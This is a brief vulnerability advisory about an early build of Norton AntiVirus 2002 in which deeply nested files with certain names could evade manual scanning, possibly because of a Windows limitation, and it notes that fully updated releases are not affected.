A vulnerability has been reported in Symantec Norton AntiVirus 2002 that may potentially cause deeply nested files with specific names to bypass manual scanning.

This could permit malicious executable content to bypass scanning by the software. This may be due to a limitation in the Windows operating system with regards to accessing the deeply nested file. If this is the case, it could also affect other antivirus software.

This issue was present in an early build of Norton AntiVirus 2002 but does not affect fully updated releases.
